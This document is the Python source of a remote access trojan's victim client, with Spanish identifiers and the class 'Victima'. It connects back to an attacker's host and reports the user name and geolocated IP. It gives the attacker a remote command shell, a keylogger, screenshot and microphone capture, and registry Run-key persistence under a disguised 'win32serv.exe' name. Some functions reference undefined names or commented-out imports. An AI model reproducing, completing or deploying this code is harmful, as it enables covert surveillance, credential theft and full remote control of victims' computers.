
# -*- coding: utf-8 -*-

# Cliente.py
# Created by Kirari Senpai


import os
import sys
import time
import socket
import json
import subprocess
import keyboard
import pickle
import urllib.request
import wave
from shutil import copyfile
#from pyautogui import screenshot as Screenshot
import pyscreenshot as ImageGrab

try:
	from win32api import GetModuleFileName, RegCloseKey, RegDeleteValue, RegOpenKeyEx, RegSetValueEx
	from win32con import HKEY_LOCAL_MACHINE, KEY_WRITE, REG_SZ
except ImportError:
	pass

from pyaudio import *
from getpass import getuser
#from Modulos.grabador import configuration,recording

class Victima:

	def __init__(self, ip, port):

		self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.direccion = str(ip)
		self.puerto = int(port)

	def iniciar(self):

		self.client.connect((self.direccion, self.puerto))
		return


	def obtener_informacion(self):

		host = getuser()
		self.client.send(bytes(host,"utf-8"))
		(self.client.recv(1024)).decode('utf-8')

		url = urllib.request.urlopen("https://geoip-db.com/json")
		objeto = json.loads(url.read().decode())
		
		ip_info = objeto["city"] + "," + objeto["IPv4"] + "," + objeto["country_name"] + "," + objeto["state"]
		self.client.send(bytes(ip_info,"utf-8"))

		return


	def server_election(self):

		while (True):

			DataElection = (self.client.recv(1024)).decode('utf-8')

			if (DataElection=="matar"):
				self.client.close();
				break

			elif (DataElection=="cmd"):
				self.client.send(bytes("ok","utf-8"))
				self.cmd()

			elif (DataElection=="grabar"):
				self.client.send(bytes("ok","utf-8"))
				self.grabar()

			elif (DataElection=="keylogger"):
				self.client.send(bytes("ok","utf-8"))
				self.keylogger()

			elif (DataElection=="screenshot"):
				self.client.send(bytes("ok","utf-8"))
				self.screenshot()

			#elif (DataElection=="instalarse"):	
			#	self.client.send(bytes("ok","utf-8"))
			#	self.instalarse()

		return


	def instalarse(self):

		self.NAME = "win32serv"
		self.SUBKEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

		copy = os.getcwd() + sys.argv[0]
		copyfile(copy,'C:\\')

		os.rename("C:\\win32serv.py","C:\\win32serv.exe")
		path = "C:\\win32serv.exe"

		key = RegOpenKeyEx(HKEY_LOCAL_MACHINE, SUBKEY, 0, KEY_WRITE)
		RegSetValueEx(key, NAME, 0, REG_SZ, path)
		RegCloseKey(key)

		return


	def remover(self):
		key = RegOpenKeyEx(HKEY_LOCAL_MACHINE, self.SUBKEY, 0, KEY_WRITE)
		RegDeleteValue(key, self.NAME)
		RegCloseKey(key)
		return

	def keylogger(self):
		keys = []

		finish_key = (self.client.recv(1024)).decode('utf-8')

		for string in keyboard.get_typed_strings(keyboard.record(finish_key)):
			keys.append(string + "\n")

		self.client.send(bytes(str(keys),"utf-8"))
		return


	def screenshot(self):
		objeto = ImageGrab.grab()
		string_object = pickle.dumps(objeto)
		#size = self.client.send(str(sys.getsizeof(string_object)))
		self.client.sendall(string_object)
		return

	def grabar(self):

		nombre = (self.client.recv(1024)).decode('utf-8')
		archivo = nombre
		self.client.send(bytes("ok","utf-8"))

		tiempo = (self.client.recv(1024)).decode('utf-8')
		duracion = int(tiempo)
		#self.client.send(bytes("ok","utf-8"))

		configuraciones = configuration(duracion,archivo)
		audio = PyAudio()
		fragmentos = []
		recording(audio,configuraciones[2],configuraciones[3],configuraciones[4],configuraciones[5],fragmentos,duracion)

		self.client.send(bytes(len(fragmentos)))

		for indice in range(len(fragmentos)):
			self.client.send(fragmentos[indice])
			self.client.recv(1024)
		
		return

		

	def cmd(self):
		
		raw_data = self.client.recv(1024)
		data = (raw_data).decode("utf-8")

		while(True):

			if("cd " in data):
				location = data.replace('cd ', "")
				
				try:
					os.chdir(location)
					self.client.send(bytes("\n Ubicacion cambiada a: " + location,"utf-8"))
				except OSError: 
					self.client.send(bytes("\n No existe la ubicacion...",'utf-8'))

			elif (data=='detener'):
				print('estoy deteniendome')
				self.client.send(bytes("ok","utf-8"))
				break


			else:
				comando = subprocess.Popen (data, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
				salida_texto = comando.stdout.read() + comando.stderr.read()
				self.client.send(salida_texto + bytes("\n Comando utilizado: ",'utf-8') + raw_data)

			raw_data = self.client.recv(1024)
			data = (raw_data).decode("utf-8")

			print(data)

		return


if __name__ == '__main__':
	direccion=sys.argv[1]
	puerto=sys.argv[2]

	s = Victima(direccion,puerto)
	s.iniciar()
	s.obtener_informacion()
	s.server_election()
	#s.manipulado()
